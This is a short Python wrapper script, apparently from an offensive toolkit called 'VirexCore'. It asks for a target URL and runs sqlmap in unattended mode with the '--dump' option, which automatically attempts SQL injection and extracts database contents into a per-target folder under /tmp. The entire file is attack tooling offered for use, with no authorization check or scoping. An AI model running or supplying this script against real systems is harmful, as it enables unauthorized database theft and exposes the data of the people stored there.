#!/usr/bin/env python3
import os
import sys
import subprocess

# Colors
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
CYAN = "\033[1;36m"
BOLD = "\033[1m"
RESET = "\033[0m"

def create_target_directory(target):
    """Create the target directory in /tmp/VirexCore/"""
    target_dir = f"/tmp/VirexCore/{target}"
    os.makedirs(target_dir, exist_ok=True)
    
    # Create sqlmap subdirectory
    sqlmap_dir = os.path.join(target_dir, "sqlmap")
    os.makedirs(sqlmap_dir, exist_ok=True)
    
    return target_dir, sqlmap_dir

def run_sqlmap(target, sqlmap_dir, url):
    """Run SQL injection with sqlmap"""
    print(f"{YELLOW}[~] Running SQL injection on {url}...{RESET}")
    
    try:
        cmd = ["sqlmap", "-u", url, "--batch", "--dump", f"--output-dir={sqlmap_dir}"]
        subprocess.run(cmd, check=True)
        print(f"{GREEN}[✓] SQL injection completed. Results saved to {sqlmap_dir}{RESET}")
        return True
    except subprocess.CalledProcessError:
        print(f"{RED}[!] Error running SQL injection{RESET}")
        return False
    except FileNotFoundError:
        print(f"{RED}[!] sqlmap not found. Please install sqlmap.{RESET}")
        return False

def main():
    """Main function"""
    if len(sys.argv) < 2:
        print(f"{RED}Usage: {sys.argv[0]} <target_ip_or_domain>{RESET}")
        sys.exit(1)
    
    target = sys.argv[1]
    target_dir, sqlmap_dir = create_target_directory(target)
    
    print(f"{GREEN}[+] Target: {target}{RESET}")
    print(f"{GREEN}[+] Output directory: {sqlmap_dir}{RESET}")
    
    # Get user input
    url = input(f"{CYAN}→ Enter Target URL (e.g., http://example.com/page.php?id=1): {RESET}")
    if not url:
        print(f"{RED}[!] URL cannot be empty{RESET}")
        sys.exit(1)
    
    # Run SQL injection
    run_sqlmap(target, sqlmap_dir, url)

if __name__ == "__main__":
    main()